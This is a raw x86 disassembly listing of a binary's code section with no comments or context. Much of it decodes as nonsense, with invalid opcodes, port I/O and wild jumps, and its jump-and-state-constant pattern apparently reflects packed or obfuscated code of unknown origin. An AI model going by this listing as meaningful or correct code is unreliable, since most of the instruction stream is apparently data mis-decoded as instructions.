  402803:	fisubr WORD PTR [edi-0x5c3da403]
  402809:	lods   eax,DWORD PTR ds:[esi]
  40280a:	bound  ebx,QWORD PTR fs:[edx]
  40280d:	add    BYTE PTR [edx+0x2915a496],ch
  402813:	xor    al,0x9f
  402815:	add    ebx,edx
  402817:	adc    ebp,eax
  402819:	and    BYTE PTR [ebp-0x5089774b],ah
  40281f:	mov    esi,?
  402821:	pop    ebx
  402822:	xchg   ebp,eax
  402823:	xor    eax,0x3830315d
  402828:	xchg   esp,eax
  402829:	fadd   QWORD PTR [edi+0x36]
  40282c:	mov    ds:0x8268ad52,al
  402831:	scas   eax,DWORD PTR es:[edi]
  402832:	pop    ebx
  402833:	xchg   edx,eax
  402834:	in     eax,0xce
  402836:	mov    dh,0xe9
  402838:	loop   0x402835
  40283a:	inc    eax
  40283b:	push   ecx
  40283c:	cmp    ebx,eax
  40283e:	cmp    DWORD PTR [eax+eiz*4+0x41489fb],ebx
  402845:	sub    ecx,DWORD PTR [eax-0x2f]
  402848:	fucomip st,st(3)
  40284a:	xlat   BYTE PTR ds:[ebx]
  40284b:	in     al,0x68
  40284d:	das    
  40284e:	xor    BYTE PTR [ebp+0x2e4e29c3],bh
  402854:	adc    eax,esp
  402856:	int3   
  402857:	repnz cmc 
  402859:	arpl   WORD PTR [edx-0x3c],dx
  40285c:	fdivr  st(0),st
  40285e:	imul   edx,esp,0xd260be56
  402864:	lods   al,BYTE PTR ds:[esi]
  402865:	(bad)  
  402866:	jmp    0x40293e
  40286b:	cs mov ch,0x9b
  40286e:	jmp    0x40280b
  402870:	out    dx,eax
  402871:	jle    0x402868
  402873:	in     al,dx
  402874:	xor    BYTE PTR [ebp-0x320f0d6b],bh
  40287a:	add    dl,BYTE PTR [ebx-0x44fffffa]
  402880:	add    BYTE PTR [eax],al
  402882:	add    BYTE PTR [eax],cl
  402884:	push   edx
  402885:	out    0xda,eax
  402887:	adc    BYTE PTR [eax-0x410ac615],bh
  40288d:	ins    BYTE PTR es:[edi],dx
  40288e:	cld    
  40288f:	pop    ebp
  402890:	cwde   
  402891:	dec    ebx
  402892:	or     BYTE PTR [eax-0x1],al
  402895:	test   al,0xb6
  402897:	xchg   esp,eax
  402898:	in     al,dx
  402899:	test   al,0x3f
  40289b:	pop    eax
  40289c:	push   esp
  40289d:	shl    BYTE PTR ds:0xbea940c2,0xbf
  4028a4:	inc    ebp
  4028a5:	dec    esp
  4028a6:	ins    BYTE PTR es:[edi],dx
  4028a7:	xor    cl,BYTE PTR [ebx]
  4028a9:	sub    dh,BYTE PTR [ebx+0x6f41b567]
  4028af:	mov    bl,0xad
  4028b1:	jns    0x402932
  4028b3:	test   BYTE PTR [ebx+0x6c0fce1c],cl
  4028b9:	cs fdivp st(3),st
  4028bc:	jns    0x4028c3
  4028be:	lea    esp,[edx+0x75438186]
  4028c4:	or     esp,DWORD PTR [ebp-0x2c]
  4028c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028c8:	or     al,bh
  4028ca:	repz cpuid 
  4028cd:	daa    
  4028ce:	cwde   
  4028cf:	cwde   
  4028d0:	lea    ebx,[esi]
  4028d2:	int3   
  4028d3:	sti    
  4028d4:	jmp    0x402911
  4028d6:	mov    eax,ds:0xb3707a45
  4028db:	mov    ss,WORD PTR [eax+0x4b]
  4028de:	adc    BYTE PTR [edx-0x1d326542],ah
  4028e4:	ss inc eax
  4028e6:	inc    edi
  4028e7:	es loope 0x4028a2
  4028ea:	cmp    BYTE PTR [ecx+0x1a],ch
  4028ed:	pop    ebp
  4028ee:	mov    edi,ebx
  4028f0:	pop    es
  4028f1:	or     eax,esi
  4028f3:	xor    BYTE PTR [ebx-0x7ac6fcd2],al
  4028f9:	mov    eax,0x76f5d27a
  4028fe:	std    
  4028ff:	scas   al,BYTE PTR es:[edi]
  402900:	fwait
  402901:	jmp    0xcd07:0x8780cf80
  402908:	ss out dx,al
  40290a:	adc    al,0xd2
  40290c:	(bad)  
  40290d:	in     eax,dx
  40290e:	sub    BYTE PTR [eax-0x35fa14d0],ah
  402914:	pop    ebx
  402915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402916:	test   BYTE PTR [ebp+0xf],bh
  402919:	fwait
  40291a:	ins    BYTE PTR es:[edi],dx
  40291b:	xchg   BYTE PTR [esp+edx*1+0x1e],cl
  40291f:	mov    al,ds:0xc35ed7a2
  402924:	in     eax,dx
  402925:	mov    ah,0xad
  402927:	mov    dh,0x8a
  402929:	cwde   
  40292a:	pop    ebp
  40292b:	cmp    al,0xb2
  40292d:	mov    edx,0x25aa813c
  402932:	ret    0x3bf5
  402935:	pop    edi
  402936:	push   ebp
  402937:	xor    DWORD PTR [edi],edi
  402939:	mov    ebx,0x5723b688
  40293e:	mov    DWORD PTR [ebp-0x8],eax
  402941:	xor    DWORD PTR ds:0x42f670,ebx
  402947:	mov    eax,DWORD PTR [ebp+0x20]
  40294a:	jmp    0x402a22
  40294f:	mov    ds:0x7f8c7fdc,al
  402954:	scas   eax,DWORD PTR es:[edi]
  402955:	repz (bad) 
  402957:	adc    eax,DWORD PTR [ecx]
  402959:	jg     0x4029ba
  40295b:	push   cs
  40295c:	xor    ebx,0x74ee4
  402962:	add    BYTE PTR [ebx+0x45000000],bh
  402968:	fs jae 0x40293a
  40296b:	adc    eax,0xb8ebad9a
  402970:	add    BYTE PTR [edx],bh
  402972:	(bad)  
  402974:	es (bad) 
  402977:	or     al,0xc9
  402979:	jmp    0x9d8b4c84
  40297e:	fdivr  st,st(3)
  402980:	mov    esp,0x55e736aa
  402985:	int3   
  402986:	push   0xddb51314
  40298b:	cmp    BYTE PTR [ecx],dh
  40298d:	push   cs
  40298e:	mov    esp,ebx
  402990:	stc    
  402991:	pop    edi
  402992:	inc    esp
  402993:	and    al,BYTE PTR [edi+esi*2-0x1a29283]
  40299a:	push   0x67
  40299c:	xor    bl,bl
  40299e:	jmp    0x8553b5bd
  4029a3:	(bad)  
  4029a4:	sbb    al,BYTE PTR [eax-0x8]
  4029a7:	add    eax,0x692c4339
  4029ac:	js     0x402956
  4029ae:	sub    bh,BYTE PTR [edi]
  4029b0:	inc    edx
  4029b1:	pop    esi
  4029b2:	add    eax,0x37ad8205
  4029b7:	pop    es
  4029b8:	xchg   ebp,eax
  4029b9:	mov    cl,0x8b
  4029bb:	mov    edi,0x5112596
  4029c0:	fbstp  TBYTE PTR [edi-0x50]
  4029c3:	adc    ch,BYTE PTR [esp+edx*1+0x5d]
  4029c7:	cmp    al,0xd4
  4029c9:	mov    edx,0xf13ff368
  4029ce:	fimul  DWORD PTR [edx+0x66f6689a]
  4029d4:	je     0x40296e
  4029d6:	sbb    al,0xe7
  4029d8:	fmul   QWORD PTR [ebp-0x42c381f5]
  4029de:	daa    
  4029df:	daa    
  4029e0:	retf   0x68c9
  4029e3:	inc    ebx
  4029e4:	or     BYTE PTR [edx+edi*2],dl
  4029e7:	mov    al,BYTE PTR ds:0x887d8657
  4029ed:	lds    ebp,FWORD PTR [edx+0x216f203f]
  4029f3:	mov    ah,0xd2
  4029f5:	sbb    al,0xa0
  4029f7:	push   cs
  4029f8:	(bad)  
  4029f9:	xor    bh,ah
  4029fb:	loopne 0x4029a2
  4029fd:	(bad)  
  4029fe:	aaa    
  4029ff:	cli    
  402a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a01:	adc    ebx,esp
  402a03:	pop    esi
  402a04:	adc    BYTE PTR [edi],ah
  402a06:	(bad)  
  402a07:	in     eax,0x35
  402a09:	jmp    0x4341:0xc15d2152
  402a10:	fs mul bh
  402a13:	aad    0x2e
  402a15:	pop    eax
  402a16:	push   0xffffffc2
  402a18:	mov    edx,0x77daa91a
  402a1d:	inc    ebx
  402a1e:	mov    ds:0x8b5759cb,eax
  402a23:	dec    ebp
  402a24:	and    al,0x81
  402a26:	sub    eax,0x42f648
  402a2b:	sub    DWORD PTR [esi+0x0],ecx
  402a2e:	add    BYTE PTR [ebx],dh
  402a30:	(bad)  
  402a31:	xor    ebx,DWORD PTR ds:0x42f644
  402a37:	mov    ebx,0x66479db3
  402a3c:	sub    DWORD PTR ds:0x42f648,0x26fa
  402a46:	sub    eax,ebx
  402a48:	or     DWORD PTR ds:0x42f618,0x42f5b4
  402a52:	jmp    0x402b2a
  402a57:	xchg   edi,eax
  402a58:	inc    edx
  402a59:	imul   ecx,DWORD PTR [edx-0x3],0xc1dfb76b
  402a60:	lea    edi,[ebx]
  402a62:	ret    
  402a63:	add    dh,BYTE PTR [edi+0x8096772]
  402a69:	add    BYTE PTR [eax],al
  402a6b:	mov    ebx,0xcc000000
  402a70:	das    
  402a71:	jns    0x402a32
  402a73:	jnp    0x402af3
  402a75:	sbb    eax,DWORD PTR [ebp-0x71]
  402a78:	es loop 0x402a25
  402a7b:	leave  
  402a7c:	mov    BYTE PTR [edi+0x181281b5],dh
  402a82:	addr16 (bad) 
  402a84:	stc    
  402a85:	mov    edi,0xf02e935d
  402a8a:	mov    gs:0x3f217cc6,eax
  402a90:	xor    ch,ah
  402a92:	mov    ecx,0xaa827633
  402a97:	sbb    BYTE PTR ds:0x5a99aa5a,bh
  402a9d:	cmp    ecx,esi
  402a9f:	dec    eax
  402aa0:	hlt    
  402aa1:	sahf   
  402aa2:	mov    ecx,0x10796f5b
  402aa7:	jnp    0x402a6d
  402aa9:	push   edx
  402aaa:	xchg   ecx,eax
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	sbb    DWORD PTR [ecx-0x48eb416e],ecx
  402ab2:	outs   dx,DWORD PTR ds:[esi]
  402ab3:	jnp    0x402af0
  402ab5:	sbb    ecx,DWORD PTR [ebp+0x6026de89]
  402abb:	test   BYTE PTR [edi+edi*8],dl
  402abe:	and    DWORD PTR [ecx-0x77],ebp
  402ac1:	popf   
  402ac2:	pop    esi
  402ac3:	xor    eax,0xa95ec43d
  402ac8:	add    eax,0x52334459
  402acd:	out    0x15,al
  402acf:	mov    edx,0xb0920d9b
  402ad4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ad5:	int3   
  402ad6:	gs push ebp
  402ad8:	sar    DWORD PTR [eax-0x139fb466],0xde
  402adf:	mov    esi,0xe111c12a
  402ae4:	ror    BYTE PTR [ecx-0xea7eca8],0xe8
  402aeb:	sbb    BYTE PTR ss:[edx+esi*4-0x4c],dl
  402af0:	rep outs dx,BYTE PTR ds:[esi]
  402af2:	dec    ebp
  402af3:	dec    ebx
  402af4:	(bad)  
  402af5:	inc    edi
  402af6:	arpl   WORD PTR [esi],di
  402af8:	retf   
  402af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402afa:	fs retf 
  402afc:	mov    ds:0xd2f6262b,al
  402b01:	cmp    ch,BYTE PTR [esi+0x1b]
  402b04:	sar    edi,cl
  402b06:	ins    DWORD PTR es:[edi],dx
  402b07:	sbb    esi,DWORD PTR [edi-0x5c]
  402b0a:	pop    ds
  402b0b:	rcl    cl,0xef
  402b0e:	test   eax,0x3c5a1a42
  402b13:	sahf   
  402b14:	or     ah,BYTE PTR [edx+0x77d9de74]
  402b1a:	jbe    0x402b6f
  402b1c:	mov    dh,0xba
  402b1e:	pop    esp
  402b1f:	cwde   
  402b20:	pop    ecx
  402b21:	cmp    edi,DWORD PTR [ebx-0x5c784351]
  402b27:	jle    0x402b65
  402b29:	jns    0x402ab4
  402b2b:	inc    ebp
  402b2c:	aam    0x83
  402b2e:	cmp    eax,0x42f5ec
  402b33:	add    BYTE PTR [edi],cl
  402b35:	lea    ebx,[ebx]
  402b37:	add    BYTE PTR [eax],al
  402b39:	add    cl,ch
  402b3b:	push   ss
  402b3c:	add    BYTE PTR [eax],al
  402b3e:	add    bh,bh
  402b40:	jne    0x402b32
  402b42:	push   DWORD PTR [ebp-0x1c]
  402b45:	push   0x2d8d
  402b4a:	push   0x2fe9
  402b4f:	call   DWORD PTR ds:0x4387dc
  402b55:	mov    DWORD PTR [ebp-0x60],0x5b40
  402b5c:	jmp    0x402c34
  402b61:	push   eax
  402b63:	xchg   ecx,eax
  402b64:	xchg   DWORD PTR [edi+0x44f8ffe7],ebx
  402b6a:	push   0xe0a09f38
  402b6f:	(bad)  [ebx]
  402b71:	les    ecx,FWORD PTR [eax]
  402b73:	add    BYTE PTR [eax],al
  402b75:	mov    ebx,0xd4000000
  402b7a:	fucomp st(3)
  402b7c:	popf   
  402b7d:	xchg   edi,eax
  402b7e:	xchg   esp,eax
  402b7f:	bound  ecx,QWORD PTR [esi+0x5d]
  402b82:	fimul  WORD PTR [esi+0x7a237f5e]
  402b88:	push   cs
  402b89:	mov    WORD PTR ds:[ebx-0x6d],cs
  402b8d:	mov    cl,0x28
  402b8f:	mov    ss,WORD PTR [edi+0x3e]
  402b92:	jno    0x402be7
  402b94:	sbb    eax,0x472229e7
  402b99:	push   0x762258dc
  402b9e:	push   ebp
  402b9f:	mov    eax,ds:0x28f94a9e
  402ba4:	shl    BYTE PTR [ebx+0x31450298],cl
  402baa:	add    BYTE PTR [eax-0x17],ch
  402bad:	cwde   
  402bae:	cwde   
  402baf:	stc    
  402bb0:	xchg   edx,eax
  402bb1:	xchg   edx,eax
  402bb2:	mov    WORD PTR [edi+0x2c7b41ab],gs
  402bb8:	popa   
  402bb9:	dec    ebx
  402bba:	mov    edi,0xa10114a5
  402bbf:	jle    0x402b82
  402bc1:	dec    esi
  402bc2:	imul   ebx,DWORD PTR [esp+eax*4+0x6d],0xffffff84
  402bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bc8:	and    eax,0xba70199
  402bcd:	mov    gs,WORD PTR [edi+0x3a]
  402bd0:	cld    
  402bd1:	jmp    0x412ba1bc
  402bd6:	adc    dl,cl
  402bd8:	adc    DWORD PTR [eax-0x77],0xb16d708e
  402bdf:	sbb    DWORD PTR [eax+0x2a7f5cc7],ecx
  402be5:	test   DWORD PTR [ebx],edi
  402be7:	in     al,dx
  402be8:	js     0x402bfe
  402bea:	nop
  402beb:	rol    DWORD PTR [ecx],0x90
  402bee:	xor    ch,BYTE PTR [ecx+edx*4-0x72]
  402bf2:	sti    
  402bf3:	enter  0xa636,0x1a
  402bf7:	or     eax,0x514b5dc1
  402bfc:	push   ds
  402bfd:	sbb    DWORD PTR [eax-0x1a],ebx
  402c00:	fst    QWORD PTR [ecx-0x13]
  402c03:	dec    edi
  402c04:	jp     0x402bdd
  402c06:	dec    esp
  402c07:	icebp  
  402c08:	fld    st(2)
  402c0a:	lods   al,BYTE PTR ds:[esi]
  402c0b:	pop    ss
  402c0c:	xchg   esi,eax
  402c0d:	(bad)  
  402c0e:	shl    ch,0xb0
  402c11:	jmp    0x402bb0
  402c13:	shl    BYTE PTR [edx+ecx*8-0x7d84e7db],1
  402c1a:	cli    
  402c1b:	nop
  402c1c:	adc    DWORD PTR [edi-0x6c],ecx
  402c1f:	sti    
  402c20:	out    0x74,eax
  402c22:	or     cl,ch
  402c24:	dec    eax
  402c25:	fcomp  DWORD PTR [edx+0x41]
  402c28:	or     DWORD PTR [esp+ecx*1-0x4a],0xcee2d4df
  402c30:	mov    esi,DWORD PTR [ecx]
  402c32:	mov    ebx,0xa445c7c6
  402c37:	dec    eax
  402c38:	adc    eax,0x45c70000
  402c3d:	mov    al,ds:0x6661
  402c42:	jmp    0x402d1a
  402c47:	hlt    
  402c48:	adc    al,al
  402c4a:	xor    esp,esp
  402c4c:	icebp  
  402c4d:	cmc    
  402c4e:	aad    0x69
  402c50:	cld    
  402c51:	ja     0x402cb2
  402c53:	xchg   ecx,eax
  402c54:	jmp    0x402c9e
  402c56:	int3   
  402c57:	jg     0x402c62
  402c59:	add    BYTE PTR [eax],al
  402c5b:	mov    ebx,0x7c000000
  402c60:	je     0x402cab
  402c62:	pop    edx
  402c63:	aaa    
  402c64:	js     0x402c50
  402c66:	dec    ebx
  402c67:	mov    eax,ds:0xf636e86f
  402c6c:	jmp    0x402cae
  402c6e:	push   ss
  402c6f:	dec    eax
  402c70:	outs   dx,BYTE PTR ds:[esi]
  402c71:	pop    ecx
  402c72:	jae    0x402c17
  402c74:	ins    DWORD PTR es:[edi],dx
  402c75:	sbb    ecx,DWORD PTR [ebp-0x62d37f53]
  402c7b:	dec    ebp
  402c7c:	std    
  402c7d:	xor    DWORD PTR [esp+esi*4-0x23dcfa8c],edx
  402c84:	out    0x5e,eax
  402c86:	rcl    BYTE PTR [bx+si+0x69],1
  402c8a:	mov    ch,BYTE PTR [ebx]
  402c8c:	add    DWORD PTR [esi],esp
  402c8e:	adc    esp,DWORD PTR [esi]
  402c90:	xchg   DWORD PTR [ebx-0x2e],edx
  402c93:	je     0x402ca3
  402c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c96:	and    BYTE PTR [ebx],dl
  402c98:	xor    DWORD PTR [edi],eax
  402c9a:	sub    ah,0xc1
  402c9d:	push   esp
  402c9e:	xor    al,0x9
  402ca0:	jo     0x402c2c
  402ca2:	mov    ebx,0x35ef59c6
  402ca7:	adc    al,al
  402ca9:	(bad)  
  402cab:	bound  ebx,QWORD PTR [edi-0x3e]
  402cae:	push   ss
  402caf:	adc    eax,0x50fa4ab1
  402cb4:	repz jecxz 0x402cec
  402cb7:	icebp  
  402cb8:	fwait
  402cb9:	mov    DWORD PTR [bp+0x29],esi
  402cbd:	mov    edx,0x954e0491
  402cc2:	ret    
  402cc3:	mov    al,0xbd
  402cc5:	sub    eax,ecx
  402cc7:	or     ah,BYTE PTR [ebx]
  402cc9:	pop    edi
  402cca:	test   DWORD PTR [edx+0x61],0x50ab4fc6
  402cd1:	xor    eax,0x96c82b4d
  402cd6:	test   eax,0x66f03243
  402cdb:	sub    bl,BYTE PTR ds:0xcc5c498f
  402ce1:	cmp    al,0x77
  402ce3:	sub    al,0xcd
  402ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce6:	test   eax,0x6291d8b9
  402ceb:	mov    dh,0x12
  402ced:	adc    edx,edx
  402cef:	push   ebp
  402cf0:	jg     0x402cee
  402cf2:	fwait
  402cf3:	js     0x402c94
  402cf5:	dec    ebx
  402cf6:	mov    edx,0x9e7aa6d5
  402cfb:	or     BYTE PTR [edx+0x28],bl
  402cfe:	mov    eax,0xb04e5c68
  402d03:	mov    dl,0x3a
  402d05:	ffree  st(5)
  402d07:	pop    esp
  402d08:	jnp    0x402cab
  402d0a:	jmp    0x3a05eaed
  402d0f:	pop    ecx
  402d10:	sbb    eax,0x17edd713
  402d15:	je     0x402d3e
  402d17:	ins    BYTE PTR es:[edi],dx
  402d18:	test   eax,0xa445c7db
  402d1d:	cld    
  402d1e:	ins    DWORD PTR es:[edi],dx
  402d1f:	add    BYTE PTR [eax],al
  402d21:	mov    DWORD PTR [ebp-0x60],0x9ce
  402d28:	jmp    0x402e00
  402d2d:	test   al,0x2a
  402d2f:	call   FWORD PTR [ebp-0x1]
  402d32:	(bad)  [edx+0x415497ff]
  402d38:	pop    ecx
  402d39:	pop    ecx
  402d3a:	dec    eax
  402d3b:	aad    0x7a
  402d3d:	cmp    cl,BYTE PTR [edx]
  402d3f:	add    BYTE PTR [eax],al
  402d41:	mov    ebx,0xe3000000
  402d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d47:	test   ebx,eax
  402d49:	shl    BYTE PTR [edi],0xb3
  402d4c:	aam    0x67
  402d4e:	retf   
  402d4f:	xor    esp,ebx
  402d51:	jp     0x402d76
  402d53:	lds    ecx,FWORD PTR [eax]
  402d55:	test   BYTE PTR [ebx+0x15],0x49
  402d59:	int    0x7c
  402d5b:	xlat   BYTE PTR ds:[ebx]
  402d5c:	push   edi
  402d5d:	out    dx,al
  402d5e:	lock push edx
  402d60:	push   0x8cf8ec03
  402d65:	into   
  402d66:	dec    esp
  402d67:	(bad)  
  402d68:	mov    dl,0xe6
  402d6a:	sub    al,0x27
  402d6c:	das    
  402d6d:	inc    esp
  402d6e:	add    eax,0x524b05d2
  402d73:	add    ch,BYTE PTR [ebp-0x2c8c6dea]
  402d79:	cld    
  402d7a:	jbe    0x402dc4
  402d7c:	add    cl,dl
  402d7e:	shl    al,0xca
  402d81:	dec    edx
  402d82:	iret   
  402d83:	loope  0x402de9
  402d85:	sub    BYTE PTR [esp+esi*1-0x1e],0x6e
  402d8a:	fwait
  402d8b:	adc    DWORD PTR [eax+0x35],esi
  402d8e:	and    BYTE PTR [ebx+eax*1-0x5c6b6066],ch
  402d95:	in     al,dx
  402d96:	aaa    
  402d97:	jle    0x402d54
  402d99:	mov    edx,0x63e14e29
  402d9e:	imul   esp,ebp,0xffffffb4
  402da1:	push   esi
  402da2:	mov    ds:0x34177f4e,eax
  402da7:	rol    BYTE PTR [ecx-0x36],1
  402daa:	pop    esp
  402dab:	push   edi
  402dac:	sub    al,0xe5
  402dae:	adc    al,0xeb
  402db0:	adc    esi,esp
  402db2:	cmp    BYTE PTR [edx+0x1eab6957],bl
  402db8:	xchg   edx,eax
  402db9:	adc    DWORD PTR [ecx],ebx
  402dbb:	mul    edx
  402dbd:	inc    edi
  402dbe:	xchg   ecx,eax
  402dbf:	push   0xffffffd7
  402dc1:	pop    ecx
  402dc2:	or     esi,DWORD PTR [eax+edx*4+0x7b]
  402dc6:	enter  0xc540,0xb8
  402dca:	lods   eax,DWORD PTR ds:[esi]
  402dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dcc:	mov    al,0x39
  402dce:	jbe    0x402d8b
  402dd0:	and    BYTE PTR [edx+0x37],0x95
  402dd4:	mov    bh,0xf9
  402dd6:	ja     0x402e3f
  402dd8:	mov    dh,0x7e
  402dda:	pop    ebx
  402ddc:	xchg   ecx,eax
  402ddd:	ja     0x402d88
  402ddf:	xlat   BYTE PTR ds:[ebx]
  402de0:	in     eax,dx
  402de1:	pop    esi
  402de2:	retf   0xb5d5
  402de5:	cmp    eax,DWORD PTR [ebx+0xf]
  402de8:	push   eax
  402de9:	js     0x402e51
  402deb:	push   ecx
  402dec:	cmp    DWORD PTR [eax-0x126f7436],edi
  402df2:	or     DWORD PTR [edx],ecx
  402df4:	fucomip st,st(4)
  402df6:	pop    ss
  402df7:	inc    esi
  402df8:	xchg   ebx,ecx
  402dfa:	mov    eax,ds:0xa29dec08
  402dff:	pop    esp
  402e00:	mov    DWORD PTR [ebp-0x5c],0x5743
  402e07:	jmp    0x402edf
  402e0c:	cmp    bh,bh
  402e0e:	shl    al,cl
  402e10:	xlat   BYTE PTR ds:[ebx]
  402e11:	std    
  402e12:	cmp    bh,bh
  402e14:	push   ds
  402e15:	pop    eax
  402e16:	lea    esi,[ebx]
  402e18:	js     0x402db5
  402e1a:	and    DWORD PTR [ebp+0xaf5],edx
  402e20:	mov    ebx,0xe9000000
  402e25:	popf   
  402e26:	add    eax,0xc8fe9e7e
  402e2b:	sahf   
  402e2c:	cmp    al,0x8e
  402e2e:	xchg   ebx,eax
  402e2f:	mov    DWORD PTR [edx+0x220acea3],ebx
  402e35:	popa   
  402e36:	pushf  
  402e37:	push   ebp
  402e38:	mov    ah,0x7b
  402e3a:	sar    BYTE PTR [edx+0x41],cl
  402e3d:	sub    al,0x7d
  402e3f:	cmp    al,0x5e
  402e41:	ret    0xb4bb
  402e44:	not    BYTE PTR [ebx-0xc]
  402e47:	dec    ecx
  402e48:	ins    DWORD PTR es:[edi],dx
  402e49:	jge    0x402e15
  402e4b:	mov    esp,0x462b4ae2
  402e50:	mov    dl,0x7a
  402e52:	ss popa 
  402e54:	sub    cl,BYTE PTR [edx-0x79015e2f]
  402e5a:	outs   dx,DWORD PTR ds:[esi]
  402e5b:	daa    
  402e5c:	out    0xaa,al
  402e5e:	cmp    eax,0xf03fa454
  402e63:	push   edx
  402e64:	jmp    0xaab690e6
  402e69:	or     BYTE PTR [ecx],cl
  402e6b:	mov    WORD PTR [edi],?
  402e6d:	cmp    eax,0x715c3659
  402e72:	and    DWORD PTR [ecx-0x324d5f73],eax
  402e78:	xor    DWORD PTR [ebx+0x7c],esp
  402e7b:	lock push esi
  402e7d:	aaa    
  402e7e:	cli    
  402e7f:	ror    DWORD PTR [ebp+0x5c5538d],1
  402e85:	push   ebp
  402e86:	push   ecx
  402e87:	ret    
  402e88:	leave  
  402e89:	outs   dx,DWORD PTR ds:[esi]
  402e8a:	call   0xbf38:0xffad7542
  402e91:	add    al,0x87
  402e93:	rol    DWORD PTR [ebp+ecx*4+0x2612b826],0xc5
  402e9b:	jne    0x402eb8
  402e9d:	sbb    edi,DWORD PTR [edi+0x42dc9820]
  402ea3:	pop    es
  402ea4:	ficom  DWORD PTR [eax-0x55ab6b12]
  402eaa:	js     0x402e7c
  402eac:	mov    ss,WORD PTR [ecx]
  402eae:	jle    0x402e9b
  402eb0:	test   BYTE PTR ds:0x889a78ac,0x40
  402eb7:	xchg   esi,eax
  402eb8:	repnz cli 
  402eba:	les    ebx,FWORD PTR gs:[esi]
  402ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ebe:	jno    0x402f10
  402ec0:	pop    esp
  402ec1:	or     eax,0x414929f1
  402ec6:	mov    ah,0x7
  402ec8:	mov    eax,0x29ffbf20
  402ecd:	jno    0x402e67
  402ecf:	das    
  402ed0:	lahf   
  402ed1:	jmp    0x4d7031ea
  402ed6:	call   0x73f0:0xab8d9fb2
  402edd:	in     eax,dx
  402ede:	mov    WORD PTR [ebp-0x60],0x48b3
  402ee4:	add    BYTE PTR [eax],al
  402ee6:	add    eax,eax
  402ee8:	mov    DWORD PTR [ebp-0x5c],0x6dc8
  402eef:	sub    eax,0x5c66
  402ef4:	mov    DWORD PTR [ebp-0x60],0x42d7
  402efb:	sub    DWORD PTR ds:0x42f5dc,0x220c
  402f05:	jmp    0x402fdd
  402f0a:	cdq    
  402f0b:	xchg   esp,eax
  402f0c:	inc    esi
  402f0d:	sub    cl,BYTE PTR [edi-0x6]
  402f10:	std    
  402f11:	mov    bh,0x1a
  402f13:	pop    ecx
  402f14:	mov    eax,0xf12b2302
  402f19:	mov    eax,ds:0xbb0
  402f1e:	mov    ebx,0x30000000
  402f23:	out    dx,al
  402f24:	retf   
  402f25:	fs pop edi
  402f27:	loopne 0x402f03
  402f29:	in     al,dx
  402f2a:	test   eax,0xef662305
  402f2f:	in     eax,dx
  402f30:	fcom   DWORD PTR [ecx]
  402f32:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f34:	outs   dx,DWORD PTR ds:[esi]
  402f35:	fst    st(0)
  402f37:	mov    ds:0x9d47d009,eax
  402f3c:	pop    esp
  402f3d:	sahf   
  402f3e:	cmp    al,0x86
  402f40:	push   ds
  402f41:	test   al,0x8b
  402f43:	int    0xc7
  402f45:	int3   
  402f46:	sub    al,0xb3
  402f48:	(bad)  [ebx+0x41]
  402f4b:	fisub  WORD PTR [ebx+0x34ade71a]
  402f51:	sbb    ah,BYTE PTR [eax]
  402f53:	mov    cl,0x44
  402f55:	inc    edx
  402f56:	mov    eax,ds:0x58a00a44
  402f5b:	inc    edi
  402f5c:	inc    esp
  402f5d:	dec    eax
  402f5e:	mov    DWORD PTR [edx+0x2e],ebp
  402f61:	pop    ebx
  402f62:	ret    0x5d77
  402f65:	vpunpckldq ymm7,ymm2,ymm6
  402f6a:	push   ss
  402f6b:	xor    eax,0xa3ea22ea
  402f70:	add    BYTE PTR [edi+0x4b],0x3e
  402f74:	cmp    BYTE PTR [eax+0x55],cl
  402f77:	inc    esi
  402f78:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f7a:	and    DWORD PTR [ebx+edi*1+0x2f],0xffffff8a
  402f7f:	adc    eax,DWORD PTR [edi+0x1e0bcca0]
  402f85:	pop    ebp
  402f86:	in     al,dx
  402f87:	mov    ebx,0xc3e0a767
  402f8c:	xchg   esp,eax
  402f8d:	xor    bh,bh
  402f8f:	pop    edi
  402f90:	jno    0x402fc7
  402f92:	pop    ebx
  402f93:	mov    dl,BYTE PTR [ebx]
  402f95:	xlat   BYTE PTR ds:[ebx]
  402f96:	or     BYTE PTR [ebx+0x50],bh
  402f99:	in     al,dx
  402f9a:	inc    edx
  402f9b:	push   es
  402f9c:	sbb    al,0xfb
  402f9e:	pop    esp
  402f9f:	adc    al,0x1a
  402fa1:	inc    edi
  402fa2:	pusha  
  402fa3:	push   0x70
  402fa5:	fimul  DWORD PTR [edi-0x67a89bcd]
  402fab:	out    0x71,eax
  402fad:	aaa    
  402fae:	(bad)  
  402faf:	mov    ecx,0xdfb20a75
  402fb4:	mov    DWORD PTR [edx+edi*2],0xa658427c
  402fbb:	enter  0x4570,0x4a
  402fbf:	mov    dh,BYTE PTR [esi+0xea31642]
  402fc5:	jne    0x403005
  402fc7:	sub    DWORD PTR [eax+edi*1-0x35],ebx
  402fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fcc:	dec    edx
  402fcd:	xor    BYTE PTR [eax+0xe9c4db0],0x2f
  402fd4:	mov    gs,WORD PTR [eax]
  402fd6:	sar    dl,cl
  402fd8:	rol    DWORD PTR [edx-0x38f9a608],0x45
  402fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fe0:	and    dh,BYTE PTR [ebx]
  402fe2:	add    BYTE PTR [eax],al
  402fe4:	mov    ecx,DWORD PTR ds:0x42c00c
  402fea:	mov    ecx,DWORD PTR [ecx]
  402fec:	sbb    DWORD PTR ds:0x42f620,ecx
  402ff2:	mov    DWORD PTR [ebp-0x58],0x7a69
  402ff9:	mov    DWORD PTR [ebp-0x54],0x5d39
  403000:	cmp    DWORD PTR ds:0x42f540,0x0
  403007:	jbe    0x403021
  40300d:	add    ecx,ecx
  40300f:	not    eax
  403011:	jmp    0x403021
